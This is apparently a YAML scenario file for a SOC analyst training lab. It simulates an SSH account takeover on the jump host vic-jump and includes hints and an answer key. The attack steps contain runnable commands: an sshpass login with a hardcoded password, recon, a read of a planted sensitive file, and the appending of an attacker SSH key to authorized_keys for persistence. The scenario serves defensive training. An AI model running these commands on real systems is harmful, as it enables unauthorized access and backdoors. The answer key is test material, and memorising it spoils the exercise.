@@ -1,0 +1,115 @@
+schema_version: "1.0"
+id: SCN-011
+name: "Login from an unrecognized source then account and file changes — vic-jump"
+description: >
+  Wazuh logged a successful SSH login to the jump host vic-jump for a
+  regular user from a single source, followed by reconnaissance, access
+  to a sensitive file, and a new SSH key added to the account. No
+  failed-auth burst preceded it. Triage and disposition.
+author: "Wachturm Contributors"
+created: 2026-05-18
+difficulty: medium
+category: lateral_movement
+expected_verdict: true_positive
+mitre:
+  - T1078
+  - T1098.004
+  - T1005
+duration_minutes: 3
+tags: [ssh, account-takeover, persistence, medium]
+
+setup:
+  - actor: vic-jump
+    # jdoe is a scenario-owned regular user (NOT analyst/admin/bobsmith/
+    # breakglass — owned by noise-gen/SCN-001/003/034; account-exclusion
+    # contract, images/noise-gen/README.md). A planted "sensitive" file
+    # gives the attacker something to take.
+    command: "id jdoe >/dev/null 2>&1 || useradd -m -s /bin/bash jdoe; echo 'jdoe:S3cur3-Pass!' | chpasswd; mkdir -p /home/jdoe && echo 'Q3 financials - CONFIDENTIAL' > /home/jdoe/financials.txt; chown -R jdoe:jdoe /home/jdoe 2>/dev/null || true"
+    description: "Ensure the 'jdoe' account and a sensitive file exist"
+
+steps:
+  - actor: atk-kali
+    # A CLEAN login (no brute force) using credentials obtained out of
+    # band — the same 5715 success signal as SCN-034's break-glass. The
+    # verdict turns on the SOURCE (unrecognized, not in the asset
+    # inventory, no change/auth record) and the post-auth BEHAVIOUR, not
+    # on auth-failure volume. atk-kali (10.50.10.250) is the lab's only
+    # SSH client; the instructor doc covers the shared-source-IP note.
+    description: "Successful SSH login as jdoe from an unrecognized source"
+    command: "sshpass -p 'S3cur3-Pass!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 jdoe@10.50.10.30 'true'"
+    delay_seconds: 0
+    timeout_seconds: 30
+
+  - actor: atk-kali
+    # Account-takeover behaviour: recon, read the sensitive file, then
+    # plant an attacker SSH key for persistence. None of this needs root
+    # (a normal user can write their own ~/.ssh) — it is exactly what a
+    # credential thief does. The student finds it by pivoting into the
+    # session, as in SCN-001.
+    description: "Post-auth: recon, sensitive-file read, and a planted SSH key (persistence)"
+    command: "sshpass -p 'S3cur3-Pass!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null jdoe@10.50.10.30 'whoami; id; uname -a; cat /home/jdoe/financials.txt; mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATTACKERKEYwachturmSCN011 attacker@evil\" >> ~/.ssh/authorized_keys; cat ~/.ssh/authorized_keys; true'"
+    delay_seconds: 6
+    timeout_seconds: 30
+
+# Proven Linux auth path (same as SCN-034): the clean SSH success fires
+# 5715 ("sshd: authentication success"); NO 5760 (no failed burst), NO
+# 5763/40112 (not brute force, not the compromise correlation). The
+# always-on watcher turns the 5715 alert (level >=3, carries srcip +
+# host + user) into the IRIS case. The account-takeover evidence lives
+# in the post-auth session the student pivots to — same model as
+# SCN-001 (alert is the entry; behaviour is the verdict).
+expected_alerts:
+  - rule_id: 5715
+    description: "sshd: authentication success (the attacker's login as jdoe)"
+    minimum_count: 1
+    timeframe_seconds: 240
+
+expected_observables:
+  - type: ip
+    value: "10.50.10.250"
+  - type: hostname
+    value: "vic-jump"
+  - type: user
+    value: "jdoe"
+
+hints:
+  - "Is this a brute force? Count the failures before the success — then ask the harder question: where did the successful login come from, and is that source in your asset inventory?"
+  - "A single clean login is not automatically benign. Pivot into what the session DID — what did the user run after authenticating?"
+  - "Recon, reading a file named 'financials', and appending a new key to authorized_keys: weigh those three together. What is an attacker establishing, and what does that make the account?"
+
+answer_key:
+  verdict: true_positive
+  severity: high
+  confidence: high
+  required_observables:
+    - type: ip
+      value: "10.50.10.250"
+      role: source
+    - type: hostname
+      value: "vic-jump"
+      role: target
+    - type: user
+      value: "jdoe"
+      role: compromised
+  summary_keywords:
+    - any_of: ["account takeover", "compromise", "compromised account", "unauthorized access", "stolen credentials"]
+    - any_of: ["persistence", "authorized_keys", "backdoor", "post-auth", "data access", "exfiltration"]
+  next_steps:
+    - contain_host
+    - reset_credentials
+    - remove_persistence
+    - escalate_t2
+  reasoning: >
+    A clean SSH success for 'jdoe' on vic-jump from a single
+    unrecognized source (10.50.10.250 — not in the asset inventory, no
+    matching change/auth record), immediately followed by host recon,
+    reading the sensitive financials file, and appending an attacker
+    SSH key to ~/.ssh/authorized_keys (persistence). There is no
+    failed-auth burst — entry was via valid stolen credentials, not
+    brute force — so the verdict turns on the hostile source and the
+    post-auth behaviour, not on alert volume. This is an account
+    takeover: a true positive. Disposition: contain vic-jump, reset
+    jdoe's credentials, remove the planted key, escalate to Tier 2 to
+    scope what else the attacker touched. Severity high (active
+    compromise with persistence and data access); confidence high (the
+    post-auth behaviour is unambiguous).
